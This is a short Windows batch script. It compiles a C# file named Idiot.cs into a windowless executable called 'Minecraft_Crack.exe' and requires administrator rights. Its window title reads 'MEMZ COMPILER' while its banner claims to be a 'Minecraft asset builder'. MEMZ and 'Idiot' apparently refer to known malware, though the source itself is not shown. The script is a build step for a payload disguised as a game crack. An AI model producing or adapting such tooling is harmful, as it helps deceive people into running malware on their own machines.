@echo off
color 0b
title MEMZ COMPILER - FOLDER: lol-main
echo ========================================
echo   MINECRAFT ASSET BUILDER (lol-main)
echo ========================================
echo.

:: 1. FORCE CURRENT DIRECTORY
cd /d "%~dp0"

:: 2. CHECK ADMIN
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] PLEASE RUN AS ADMINISTRATOR!
    echo Right-click this file and select 'Run as Administrator'.
    pause
    exit
)

:: 3. VERIFY IDIOT.CS EXISTS
if not exist "Idiot.cs" (
    echo [ERROR] Idiot.cs NOT FOUND in: %cd%
    echo Please make sure Idiot.cs is in this folder.
    dir /b
    pause
    exit
)

:: 4. FIND DOTNET COMPILER
set "CSC64=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
set "CSC32=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

if exist "%CSC64%" (
    set "CSC=%CSC64%"
) else if exist "%CSC32%" (
    set "CSC=%CSC32%"
) else (
    echo [ERROR] .NET Framework 4.0/4.5 is NOT INSTALLED!
    pause
    exit
)

echo [SYSTEM] Compiler found at: %CSC%
echo [SYSTEM] Compiling Idiot.cs...
echo.

:: 5. EXECUTE BUILD
"%CSC%" /target:winexe /out:"Minecraft_Crack.exe" "Idiot.cs"

if exist "Minecraft_Crack.exe" (
    echo.
    echo ========================================
    echo   SUCCESS! Minecraft_Crack.exe created!
    echo ========================================
) else (
    echo.
    echo [FAILED] There is a syntax error in Idiot.cs.
)

echo.
pause
